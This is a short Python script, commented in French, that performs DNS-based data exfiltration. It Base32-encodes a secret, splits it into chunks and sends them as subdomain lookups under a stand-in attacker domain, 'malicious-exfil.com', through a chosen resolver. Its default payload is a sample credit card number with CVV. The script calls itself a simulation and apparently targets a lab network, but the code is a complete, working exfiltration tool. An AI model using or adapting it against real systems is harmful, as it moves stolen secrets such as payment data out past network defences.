#!/usr/bin/env python3
"""
Simulation d'Exfiltration de données via requêtes DNS.
Découpe un message/fichier secret, l'encode en Base32 et envoie des sous-domaines vers le résolveur cible.
"""
import sys
import time
import base64
import argparse
from datetime import datetime
from dns import resolver

def exfiltrate_data(data: str, domain: str, target_dns: str, delay: float = 0.3):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    encoded = base64.b32encode(data.encode('utf-8')).decode('utf-8').rstrip('=').lower()

    print(f"================================================================")
    print(f"[*] Attaque démarrée à : {now_str}")
    print(f"[*] Type : Exfiltration de données via DNS (Base32 chunks)")
    print(f"[*] Résolveur cible : {target_dns}")
    print(f"[*] Domaine pirate : *.{domain}")
    print(f"[*] Donnée brute : {data}")
    print(f"[*] Payload encodé : {encoded}")
    print(f"================================================================\n")

    chunk_size = 30
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    total = len(chunks)
    session_id = "exf01"

    res = resolver.Resolver()
    res.nameservers = [target_dns]
    res.timeout = 2
    res.lifetime = 2

    for seq, chunk in enumerate(chunks, 1):
        fqdn = f"{chunk}.seq{seq}-{total}.{session_id}.{domain}"
        cur_ts = datetime.now().strftime("%H:%M:%S")
        print(f"  [{cur_ts}] > Fragment {seq}/{total} transmis : {fqdn}")
        try:
            res.resolve(fqdn, 'A')
        except Exception:
            pass
        time.sleep(delay)

    end_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] Attaque terminée à : {end_str}")
    print(f"[+] Total : {total} fragments transmis avec succès.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulateur d'exfiltration DNS")
    parser.add_argument("--dns", default="172.28.0.2", help="IP du résolveur DNS cible")
    parser.add_argument("--domain", default="malicious-exfil.com", help="Domaine d'exfiltration")
    parser.add_argument("--data", default="NUM_CB:4532015112830366 CVV:737 EXP:12/27", help="Donnée confidentielle")
    parser.add_argument("--delay", type=float, default=0.3, help="Délai entre requêtes en secondes")
    args = parser.parse_args()

    exfiltrate_data(args.data, args.domain, args.dns, args.delay)
